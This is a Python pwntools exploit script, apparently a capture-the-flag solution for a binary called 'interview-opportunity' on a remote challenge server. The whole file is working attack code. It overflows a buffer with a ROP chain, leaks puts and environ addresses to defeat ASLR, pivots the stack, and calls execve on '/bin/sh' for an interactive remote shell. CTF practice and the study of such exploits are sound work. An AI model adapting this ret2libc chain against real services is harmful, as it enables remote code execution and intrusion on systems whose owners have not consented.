from pwn import *

BIN_NAME = 'interview-opportunity'
REMOTE_ADDR = 'mc.ax'
REMOTE_LIBC_PATH = 'libc.so.6'
REMOTE_PORT = 31081
LOCAL = False

chall = ELF(BIN_NAME)
context.binary = chall

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

def send_rop(chain):
    if LOCAL is None: return
    assert len(chain) + 34 <= 70, str(34 + len(chain))
    stream.sendline(b'\x00' * 34 + chain)
    stream.recvuntil(b'\n\n')

rop = ROP(chall)
rop.call('puts', [chall.got["puts"]])
rop.call('main', [])
send_rop(rop.chain())
puts_addr = unpack(stream.recvline(keepends=False), "all")

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so' if LOCAL else REMOTE_LIBC_PATH)
libc.address = puts_addr - libc.symbols["puts"]
print(f'{hex(libc.address)=}')

rop = ROP(chall)
rop.call('puts', [libc.symbols["environ"]])
rop.call('main', [])
send_rop(rop.chain())
stack_addr = unpack(stream.recvline(keepends=False), "all")
print(f'{hex(stack_addr)=}')

rop = ROP(chall)
rop.raw(rop.find_gadget(['pop rbp', 'ret']))
rop.raw(stack_addr - 0x80 + 0x1a)
rop.raw(0x401276)
print(rop.dump())
send_rop(rop.chain())

rop = ROP(libc)
# use int 90
rop.execve(next(libc.search(b'/bin/sh')), 0, 0)

# use call
# rop.call('execve', [b'/bin/sh', 0])
assert len(rop.chain()) <= 70
pause()
stream.sendline(rop.chain())

stream.interactive()
